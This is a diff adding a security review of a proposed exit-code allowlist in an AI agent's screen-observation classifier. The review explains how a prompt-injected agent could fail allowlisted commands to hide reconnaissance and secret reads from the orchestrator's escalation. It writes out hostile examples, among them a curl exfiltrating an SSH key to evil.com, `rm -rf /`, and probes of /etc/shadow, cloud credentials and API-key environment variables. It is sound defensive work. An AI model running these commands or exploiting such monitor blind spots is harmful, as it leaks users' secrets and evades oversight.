@@ -1,0 +1,107 @@
+<security_analyst_findings>
+
+<finding id="SA-1">
+<title>INFORMATIONAL_NONZERO allowlist is a screen-content exfil/blindness primitive when LLM is prompt-injected</title>
+<confidence>HIGH</confidence>
+<severity>HIGH</severity>
+<evidence>
+candidate_A.md:13 — proposal: when `shlex.split(last_command)[0]` matches the allowlist and `exit_code != 0`, return `EventType.SUCCESS` with `needs_llm=False`, summary "informational non-zero".
+observation.py:92-100 — current Branch 3 returns ERROR, `needs_llm=True`, and an `_extract_error_hint_generic` summary that includes the failing line.
+observation.py:156-169 (`format_event_for_llm`) — `needs_llm=False` SUCCESS becomes `[OK exit:N] informational non-zero (exit N)` injected into the next-turn user message; `interactive_runner.py:354` only appends this *instead of* the raw screen diff path. The orchestrator LLM never sees the failure contents.
+interactive_runner.py:351-354 — the gate that suppresses raw-screen injection depends on `not obs_event.needs_llm`.
+</evidence>
+<impact>
+Today, Branch 3 surfaces error-shaped lines to the orchestrator LLM; that is a load-bearing safety property even though the proposal frames it as "wasted tokens". Once `grep`, `egrep`, `fgrep`, `test`, `[`, `cmp -s`, `diff -q`, `pgrep` are silenced on non-zero exit, an attacker who has already prompt-injected the agent (a documented threat — see SPEC/byollm-delegate docs about delegate channel) can deliberately *fail* an allowlisted command after writing sensitive data to the pane in stderr/stdout, knowing the screen contents will be hidden from the next-turn classifier injection. Concretely: `grep nomatch /etc/passwd; exit 1` → silenced; `test "$(printenv ANTHROPIC_API_KEY)" = ""` → silenced; `pgrep -af clive` exit 1 → silenced. Note `prev_screen` is still kept around for diff computation but the *event* surfaced to the LLM no longer escalates.
+</impact>
+<recommendation>
+The allowlist must be paired with a screen-content scan: even on allowlist hit, if `INTERVENTION_PATTERNS`, `_ERROR_TYPES`, or a `secret`-shaped regex (`api[_-]?key`, `BEGIN .* PRIVATE KEY`, `password=`) match the tail, fall back to `needs_llm=True`. Also drop `pgrep` from the seed list — exit-1 from `pgrep` is genuinely informational only in narrow contexts and broadens the silenceable surface unnecessarily.
+</recommendation>
+</finding>
+
+<finding id="SA-2">
+<title>`shlex.split(last_command)[0]` is parsed on attacker-controlled, *pre-sandbox-wrap* text — IndexError + ValueError DoS, plus allowlist bypass via leading env-assignment</title>
+<confidence>HIGH</confidence>
+<severity>MEDIUM</severity>
+<evidence>
+candidate_A.md:13 — proposal matches against `shlex.split(last_command)[0]`.
+interactive_runner.py:301 (`cmd = extract_command(reply)`) and toolcall_runner.py:54 (`cmd = args.get("command", "")`) — `cmd` comes from the LLM reply or tool-call args, i.e. is *fully attacker-controllable* under any prompt-injection scenario (the orchestrator LLM is treated as semi-trusted by the rest of Clive but the planner explicitly assumes hostile screen contents — `networking/protocol.py` frame nonces exist for exactly this).
+interactive_runner.py:92 / toolcall_runner.py:66 — by the time the *wrapped* `cmd` reaches `_send_agent_command`, it has been rewritten to `bash 'sandbox/run.sh' '/tmp/...' 'real-command'`. So `last_command=cmd` passed *after* wrapping (the natural reading of "the cmd already in scope") makes `shlex.split(cmd)[0] == "bash"`, never matching the allowlist — the optimization silently no-ops under sandbox mode. Pass it *before* wrapping and you have a different problem: `shlex.split("")` returns `[]` → `IndexError` on `[0]`; unterminated quotes (`grep "foo`) raise `ValueError`. Either path is a per-turn crash that aborts the runner via the bare `except Exception` at interactive_runner.py:263 only if the classify call is wrapped — but the proposal places the classify call at line 352 inside the `if exit_code == 0` block, which is *not* wrapped in a try.
+Furthermore, `shlex.split("FOO=bar grep pattern file")[0] == "FOO=bar"` — does not match. Conversely `shlex.split("grep pattern; rm -rf /")[0] == "grep"` matches the allowlist *because shlex does not respect shell metacharacters as separators*, so a compound `grep nomatch foo; curl evil.com/$(cat ~/.ssh/id_rsa | base64)` exits non-zero (grep miss → exit 1) and gets silenced.
+</evidence>
+<impact>
+Three concrete failures: (a) crashes (`IndexError`, `ValueError`) on malformed/empty input — DoS of the runner turn; (b) trivial bypass-into-silence by appending arbitrary commands after a `;`, `&&`, `||`, `|` to an allowlisted head — the compound is silenced as "informational non-zero" because shlex tokens don't honor shell control operators; (c) silent no-op when sandbox-wrapped (the optimization stops working in the exact environment it most matters: untrusted code).
+</impact>
+<recommendation>
+(a) Wrap the parse: `try: head = shlex.split(last_command)[0] except (ValueError, IndexError): return <unchanged>`. (b) Reject any `last_command` containing `;`, `&&`, `||`, `|`, `&`, `` ` ``, `$(`, `>(`, `<(` — fall through to the existing Branch 3. (c) Pass the *pre-sandbox-wrap* cmd explicitly, and document that contract at both call sites; do not rely on "the cmd in scope" since its meaning differs by ~50 lines of code.
+</recommendation>
+</finding>
+
+<finding id="SA-3">
+<title>Argument-injection / suffix-check on `git diff --quiet` matches `git diff --quiet --no-index /etc/shadow` and similar privileged forms</title>
+<confidence>MEDIUM</confidence>
+<severity>MEDIUM</severity>
+<evidence>
+candidate_A.md:13 — "plus a tiny suffix check for `git diff --quiet`".
+The seed allowlist also contains the bare token `git diff --quiet` and `git diff --exit-code`, which by `shlex.split(...)[0] == "git"` is *too coarse* — every `git` subcommand would match unless the check is a startswith over the joined tokens. The proposal isn't precise about this.
+observation.py has no current notion of "argument-shape safety" — Branch 3 cares only about exit code.
+</evidence>
+<impact>
+If the implementer reads "match against `shlex.split(last_command)[0]`" literally, then `git` (any subcommand) is silenced on non-zero exit. `git push` rejection (exit 1), `git commit` hook failure (exit 1), `git fetch` auth failure (exit 128) all become `[OK exit:N] informational non-zero` — the orchestrator never learns the push failed and may report DONE on a non-pushed branch. If the implementer instead does a *prefix* string match `last_command.startswith("git diff --quiet")`, then `git diff --quiet --no-index /etc/shadow $HOME/.ssh/id_rsa` (a known information-leak primitive: the diff is silent but the filesystem read happens) is silenced from the operator's view.
+</impact>
+<recommendation>
+Match the *full* command head against a canonical normalization (`re.sub(r"\s+", " ", cmd).strip()` then exact equality or `head + " "` prefix to a tightly enumerated list). Do not accept "starts with `git diff --quiet`" without enforcing that the remaining arguments are pathspecs and not `--no-index`, `--ext-diff`, `--textconv`, etc. Drop the suffix-check shortcut entirely; if it isn't precise enough to write down, it isn't precise enough to merge.
+</recommendation>
+</finding>
+
+<finding id="SA-4">
+<title>`test` and `[` allowlist entries silence the canonical filesystem/credential probe pattern</title>
+<confidence>HIGH</confidence>
+<severity>MEDIUM</severity>
+<evidence>
+candidate_A.md:13 — `INFORMATIONAL_NONZERO` includes `"test"` and `"["`.
+observation.py:92-100 — currently `test -f /root/.aws/credentials` exit 1 → ERROR with `needs_llm=True`, escalating to the LLM with the failing line in `summary`.
+interactive_runner.py:305 (`_check_command_safety`) — runtime.py:53-64 BLOCKED_COMMANDS list contains no entry for `test`/`[`; these go through unimpeded.
+runtime.py:67 — only pattern-based blocks; no semantic awareness of probing.
+</evidence>
+<impact>
+A prompt-injected agent (or an LLM that has hallucinated a hostile task) can use the silenced primitive to systematically probe the filesystem with zero token cost and zero visibility to the orchestrator: `test -f /home/$USER/.ssh/id_ed25519`, `test -r /etc/shadow`, `[ -f /var/lib/postgresql/data/postgresql.conf ]`. Each probe's exit code is observable to the in-pane LLM via the next prompt (the exit marker is in the screen) but the orchestrator's classifier event will be `[OK exit:1] informational non-zero` — the *escalation* surface is gone. Combined with SA-1, this lets the in-pane LLM run an entire reconnaissance loop without ever tripping `needs_llm=True`.
+</impact>
+<recommendation>
+Either remove `test`/`[` from the allowlist (they are too generic — they take arbitrary paths/expressions) or restrict the silencing to *specific test expressions* matching a regex (`-z`, `-n` on shell-internal vars; not `-r`, `-w`, `-f`, `-d` on paths). The whole point of needs_llm is to escalate when something interesting happened; "informational" is a property of intent, not of command name.
+</recommendation>
+</finding>
+
+<finding id="SA-5">
+<title>`last_command` is not redacted before reaching the `summary` field, leaking through telemetry, decision logs, and event renders</title>
+<confidence>MEDIUM</confidence>
+<severity>LOW</severity>
+<evidence>
+candidate_A.md:13 — proposed summary: `f"informational non-zero (exit {exit_code})"`. This is fine *as written*, but the natural V2 (already hinted by judge themes in handoff.json line 39-41 about "decision log") will read the command head into the summary for debugging. The codebase has a precedent: `_extract_error_hint_generic` (observation.py:141-153) already pulls raw screen lines verbatim into `event.summary`, and `format_event_for_llm` (observation.py:156-169) sends those summaries into the next-turn LLM context, into the on_event callback (interactive_runner.py:290 `_emit`), and into the TUI log.
+handoff.json:39 already flags `kubectl logs, env, printenv leak secrets` as an unresolved privacy concern for persistent screen capture. Adding `last_command` plumbing to the classifier is exactly the place where command lines containing secrets (`mysql -p<password>`, `curl -H "Authorization: Bearer $TOK" ...`) become first-class citizens in the classification path.
+</evidence>
+<impact>
+If/when the summary or `ScreenEvent` grows a `last_command` field, every downstream consumer (`format_event_for_llm`, TUI log, `_emit("turn", ...)`, future decision logs) inherits it without redaction. The proposal explicitly punts decision logging as "separable" but does not require a redaction interface for command strings — meaning the future log will need to invent one or leak by default.
+</impact>
+<recommendation>
+If `last_command` enters `ScreenEvent`, gate it behind a `_redact_command(cmd: str) -> str` helper from day one — strip `-p<...>`, `--password=<...>`, `--token=<...>`, `Authorization:.*`, anything matching common secret-env regex (`API_KEY=...`). This is cheap to add now and architecturally hostile to add later. The proposal should explicitly say "`last_command` flows ONLY into branch logic, never into `ScreenEvent.summary` or `raw_output`" — otherwise expect drift.
+</recommendation>
+</finding>
+
+<finding id="SA-6">
+<title>Eval scenarios proposed don't exercise the adversarial cases — bench will green-light a classifier that allow-lists hostile command shapes</title>
+<confidence>MEDIUM</confidence>
+<severity>MEDIUM</severity>
+<evidence>
+candidate_A.md:16 — proposed eval additions: `cmd_aware_git_diff_clean`, `cmd_aware_grep_miss`, `cmd_aware_test_false`, plus *one* negative (`make` exit 2). No adversarial scenarios.
+codebase-analysis.md:38-44 — the existing `evals/observation/scenarios.py` covers L2 byte-stream detection (color, prompts, spinners), not command-shape adversarial inputs. So the bench Clive ships today has zero coverage for compound commands, env-prefix prepends, unterminated quotes, or screen-tail secret leaks.
+candidate_A.md:22 — merge gate is purely `cost_tokens -30%` AND `missed_rate <=`. Neither metric expresses "did we silence an error we should not have silenced" or "did a sensitive token in the tail get correctly escalated".
+</evidence>
+<impact>
+The proposal makes the merge gate falsifiable on *cost* but not on *escalation precision in the presence of adversarial inputs*. A classifier that silences `grep nomatch /etc/passwd; cat ~/.aws/credentials` (compound silenced via SA-2) will pass the bench because the bench doesn't include such inputs and `missed_rate` is computed only against the synthetic L2 event corpus, not against a "should-have-escalated" oracle for hostile shells. Critic theme in handoff.json:39 ("Persistent screen capture has unresolved privacy concerns — kubectl logs, env, printenv leak secrets") is exactly this class of miss, and the proposal does not bring it into the bench.
+</impact>
+<recommendation>
+Add at least four negative scenarios before merge: (a) compound command with allowlisted head and trailing destructive op exiting non-zero — must escalate; (b) allowlisted command whose tail contains a secret-shaped regex hit — must escalate; (c) `git diff --quiet --no-index /etc/passwd /tmp/x` — must escalate (treat as not the canonical informational form); (d) malformed/empty `last_command` — must not crash, must default to today's behavior. Gate the PR on these *in addition* to the cost+missed_rate criterion. Without them the "falsifiable single PR" framing is only falsifiable on the dimension that's easy to measure.
+</recommendation>
+</finding>
+
+</security_analyst_findings>
